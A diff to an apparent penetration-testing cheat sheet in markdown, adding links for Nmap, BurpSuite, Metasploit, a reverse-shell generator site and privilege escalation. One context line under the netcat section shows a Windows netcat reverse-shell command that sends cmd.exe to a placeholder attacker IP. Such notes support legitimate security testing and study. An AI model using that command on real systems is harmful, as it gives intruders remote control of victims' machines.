@@ -21,7 +21,9 @@
 - [16. Simple Local Web Servers](#localweb)
 
 
+# [1. Nmap](/nmap.md)
 
+# [2. BurpSuite](/burpsuite.md)
 
 
 # 3. Gobuster <a name="gobuster"></a>
@@ -156,6 +158,10 @@ exploit
 
 
 
+# [12. Metasploit](/metasploit.md)
+
+
+
 
 # 13. netcat <a name="nc"></a>
 ```php
@@ -178,6 +184,10 @@ __Download the reverse shell in windows__
     - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
+# [14. Reverse_Shell_Script](https://revshells.com)
+
+
+# [15. Privilege escalation](/Privilege.md)
 
 
 
